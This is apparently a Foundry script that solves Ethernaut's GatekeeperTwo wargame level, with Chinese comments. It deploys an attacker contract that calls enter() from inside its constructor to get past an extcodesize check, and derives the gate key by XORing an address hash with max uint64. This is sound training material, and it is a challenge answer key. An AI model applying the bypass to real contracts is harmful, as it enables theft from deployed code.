// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/GatekeeperTwo.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// target 通過三個檢查成為參賽者
// gateOne 和上一道題目一樣
// extcodesize(caller()) 要確保呼叫者地址的程式碼大小是 0 -> 寫的攻擊合約只在 construct 發動, 不能寫其他 function

contract attackCon {
    // address public challengeInstance;
    GatekeeperTwo challengeInstance;

    constructor(address _challengeInstance) {
        challengeInstance = GatekeeperTwo(_challengeInstance);
        uint64 key = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        ) ^ type(uint64).max;
        (bool result, ) = address(challengeInstance).call(
            abi.encodeWithSignature("enter(bytes8)", bytes8(key))
        );
    }
}
contract Lev14Sol is Script {
    GatekeeperTwo public Lev14Instance =
        GatekeeperTwo(0x2eb0F6b927e7992d518944a1ca62dB635794aA31);
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        attackCon myattackCon = new attackCon(address(Lev14Instance));
        myattackCon;
        vm.stopBroadcast();
    }
}
